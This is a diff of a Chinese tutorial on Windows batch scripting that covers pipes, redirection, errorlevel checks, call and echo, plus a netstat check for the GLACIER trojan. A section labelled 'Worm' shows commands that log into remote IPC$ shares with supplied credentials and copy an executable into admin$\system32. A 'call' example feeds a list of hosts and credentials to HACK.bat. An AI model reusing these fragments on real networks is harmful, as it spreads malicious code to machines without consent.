@@ -55,12 +55,12 @@ echo.
     a.bat
 
 10.使用批处理脚本检测是否中木马病毒（通过检测端口的方式，例如端口7626）。脚本内容如下：
-   @echo off
-   netstat -a -n > a.txt
-   :: type命令列出a.txt中的内容
-   type a.txt | find "7626" && echo "Congratulations! You have infected GLACIER!"
-   del a.txt
-   pause & exit
+    @echo off
+    netstat -a -n > a.txt
+    :: type命令列出a.txt中的内容
+    type a.txt | find "7626" && echo "Congratulations! You have infected GLACIER!"
+    del a.txt
+    pause & exit
 
 11.Worm
     net use \\%1\ipc$ %3 /u:"%2"
@@ -70,17 +70,40 @@ echo.
     copy NWZI.EXE \\%1\admin$\system32 /y
     attrib \\%1\admin$\system32\10.bat -r -h -s
 
-12.more命令
-    more a.txt和type a.txt。利用more命令，可以达到逐屏或逐行显示输出的效果，而type命令只能一次把输出显示完，最后的结果就是只能看到末尾的部分。在例十三里，more命令的作用就是让输出的信息逐屏或逐行显示。
-    看到这里，你是否已经能隐约感受到了|命令的作用了？没错，它的作用，就是把前一命令的输出当后一命令的输入来用的。
+12.help | more
+    more命令。可能很多朋友以前就没有接触过这个命令，这个命令在Linux下的用处非常广泛，也是管道命令之一。大家可以找一篇比较长的文章（a.txt）在DOS提示符下输入如下两个命令去比较一下差别：more a.txt和type a.txt。利用more命令，可以达到逐屏或逐行显示输出的效果，而type命令只能一次把输出显示完，最后的结果就是只能看到末尾的部分。
+    |命令的作用，就是把前一命令的输出当后一命令的输入来用的。在例十三里，前一命令的输出，就是help命令执行后显示的DOS所支持的所有非隐含命令，而这个结果刚好做了后一命令more的输入。所以“help | more”和下例是等效的：
+    help > a.txt
+    more a.txt
+    del a.txt
+    这里利用另一管道命令>生成了一个a.txt文件作为中间环节，在用more命令查看a.txt文件后再删除a.txt文件（例十三的所有操作是在内存中进行的，不生成文件）。可以看出，正确使用管道命令|可以带来事半功倍的效果。
 
 13.>、>>
-   输出重定向命令，说的通俗一点，就是把前面命令的输出写入到一个文件中。这两个命令的唯一区别是，>会清除掉原有文件中的内容后把新的内容写入原文件，而>>只会另起一行追加新的内容到原文件中，而不会改动其中的原有内容。
+    输出重定向命令，就是把前面命令的输出写入到一个文件中。这两个命令的唯一区别是，>会清除掉原有文件中的内容后把新的内容写入原文件，而>>只会另起一行追加新的内容到原文件中，而不会改动其中的原有内容。
 
 14.if结果判断：
-   masm %1.asm
-   if (not) errorlevel 1 pause & edit %1.asm
-   link %1.obj
-   先对源代码进行汇编，如果失败则暂停显示错误信息，并在按任意键后自动进入编辑界面；否则用link程序连接生成的obj文件。
-   这种用法是先判断前一个命令执行后的返回码（也叫错误码，DOS程序在运行完后都有返回码），如果和定义的错误码符合（这里定义的错误码为1），则执行相应的操作（这里相应的操作为pause & edit %1.asm部分）。
-   “if not errorlevel 1”和“if errorlevel 0”的效果是等效的
+    masm %1.asm
+    if (not) errorlevel 1 pause & edit %1.asm
+    link %1.obj
+    先对源代码进行汇编，如果失败则暂停显示错误信息，并在按任意键后自动进入编辑界面；否则用link程序连接生成的obj文件。
+    这种用法是先判断前一个命令执行后的返回码（也叫错误码，DOS程序在运行完后都有返回码），如果和定义的错误码符合（这里定义的错误码为1），则执行相应的操作（这里相应的操作为pause & edit %1.asm部分）。
+   “if not errorlevel 1”和“if errorlevel 0”的效果是等效的。
+
+15.call调用
+    CALL ipc.bat IPCFind.txt
+    ========================
+    ipc.bat：
+    for /f "tokens=1,2,3 delims= " %%i in (%1) do call HACK.bat %%i %%j %%k
+    在start.bat中，ipc.bat后面跟了参数ipcfind.txt（一个文件，也可以做参数），执行时的效果，就是用ipc.bat中的每一行的三个变量（这里不懂没关系，学过for命令后就懂了），对应代换ipc.bat中的%%i、%%j和%%k。
+
+16.echo
+    “反馈”、“回显”，echo on和echo off两个命令
+    显示信息，类似于println
+    可以直接生成编辑文本文件 echo nbtstat -A 192.168.0.1 > a.bat
+
+17.<、>&、<&
+    <，输入重定向命令，从文件中读入命令输入，而不是从键盘中读入。
+    >&，将一个句柄的输出写入到另一个句柄的输入中。
+    <&，刚好和>&相反，从一个句柄读取输入并将其写入到另一个句柄输出中。
+
+18.组合命令：&、&&、||
